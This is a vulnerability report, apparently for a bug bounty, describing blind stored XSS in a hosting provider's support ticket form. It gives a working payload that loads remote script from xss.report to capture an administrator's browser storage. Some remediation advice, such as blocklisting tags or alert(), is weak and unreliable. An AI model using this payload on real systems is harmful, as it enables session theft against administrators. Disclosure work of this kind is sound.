## Title
Blind XSS - ZAP-Hosting

## Description
**Affected URL:** https://contact.pwnedbox.site/

The support ticket form accepts user-controlled input in the Name, Subject, and Message fields. A JavaScript payload containing an external script from xss.report was submitted through the ticket form. The submitted content was stored and later triggered a callback when the ticket was viewed through the administrative interface, demonstrating Blind Stored Cross-Site Scripting (Blind XSS).

The callback dashboard recorded activity associated with the vulnerable page and displayed browser-side information, including session storage, local storage, and DOM data.

## Steps to Reproduce

1. Open the affected URL: https://contact.pwnedbox.site/
2. Open the **Create ticket via mail** form.
3. Enter the following payload into the Name, Subject, and Message fields: `"><script src=https://xss.report/c/priyanshxop ></script>`
4. Complete the required email field and CAPTCHA, then submit the ticket.
5. Access the administrative interface and open the submitted ticket.
6. Check the xss.report callback dashboard for activity associated with the submitted payload.
7. Review the callback details to observe the captured browser-side information.

## POC (Proof of Concept)

Screenshot 1: Support ticket form with the payload entered into Name, Subject, and Message.

<img width="1917" height="963" alt="image" src="https://github.com/user-attachments/assets/7d640a2e-3bd9-407b-b42c-7e7c85fe164a" />

Screenshot 2: Administrative login page.

<img width="1915" height="956" alt="image" src="https://github.com/user-attachments/assets/a7a929b0-7be3-40ff-9c1c-4f2ce309075d" />

Screenshot 3: Submitted ticket displayed in the administrative interface.

<img width="1918" height="965" alt="image" src="https://github.com/user-attachments/assets/f5595b15-b843-4fb0-b7c2-46d67ca7182e" />

Screenshot 4: xss.report activity dashboard showing callbacks from the affected page.

<img width="1918" height="956" alt="image" src="https://github.com/user-attachments/assets/d0214f89-27e9-4559-9d0c-af329d9b7fca" />

Screenshot 5: Callback details displaying session storage, local storage, and DOM information.

<img width="1918" height="968" alt="image" src="https://github.com/user-attachments/assets/a836df65-e919-4be7-a1e5-00288f9975d2" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.

## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
